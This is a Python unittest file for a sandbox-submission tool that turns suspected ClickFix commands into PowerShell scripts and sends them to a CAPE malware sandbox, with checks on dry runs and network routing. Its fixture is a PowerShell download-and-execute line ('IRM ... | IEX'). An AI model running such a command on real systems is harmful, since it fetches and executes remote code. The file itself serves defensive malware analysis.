"""Offline tests for detonate (command -> .ps1 file -> CAPE submit)."""
import json
import os
import shutil
import sys
import tempfile
import types
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "clickfix"))

import detonate as d  # noqa: E402

PS1_CMD = 'IRM fastly.jsdelivr.net/gh/x/y | IEX'


class _FakeCape:
    def __init__(self):
        self.calls = []

    def submit_payload(self, filename, content, package, custom="", machine=""):
        self.calls.append({"filename": filename, "package": package, "content": content})
        return types.SimpleNamespace(task_id=777, raw_response={})


class DetonateTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        from config import load_config
        self.cfg = load_config()
        self.cfg.pipeline.commands_dir = os.path.join(self.tmp, "commands")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_build_writes_ps1_with_command(self):
        info = d.build_script_file(PS1_CMD, self.cfg, self.cfg.pipeline.commands_dir)
        self.assertEqual(info["package"], "ps1")
        self.assertTrue(info["path"].endswith(".ps1"))
        with open(info["path"]) as fh:
            self.assertIn("IEX", fh.read())

    def test_dry_run_does_not_submit(self):
        fake = _FakeCape()
        out = d.detonate(PS1_CMD, self.cfg, route="drop", commit=False, client=fake)
        self.assertEqual(out["status"], "dry_run")
        self.assertEqual(fake.calls, [])
        self.assertTrue(os.path.isfile(out["path"]))  # file still written

    def test_commit_submits_via_given_route(self):
        fake = _FakeCape()
        out = d.detonate(PS1_CMD, self.cfg, route="drop", commit=True, client=fake)
        self.assertEqual(out["status"], "submitted")
        self.assertEqual(out["cape_task_id"], 777)
        self.assertEqual(len(fake.calls), 1)
        self.assertEqual(fake.calls[0]["package"], "ps1")
        self.assertIn(b"IEX", fake.calls[0]["content"])

    def test_internet_submits_full_detonation(self):
        fake = _FakeCape()
        out = d.detonate(PS1_CMD, self.cfg, route="internet", commit=True, client=fake)
        self.assertEqual(out["status"], "submitted")
        self.assertEqual(out["route"], "internet")
        self.assertEqual(len(fake.calls), 1)

    def test_default_route_is_isolated_or_drop_never_internet(self):
        # with no isolated route configured in a test env, default resolves to 'drop'
        self.assertIn(d._resolve_route(None, self.cfg), ("drop", "vpn", "tor", "inetsim"))
        self.assertNotEqual(d._resolve_route(None, self.cfg), "internet")


if __name__ == "__main__":
    unittest.main()
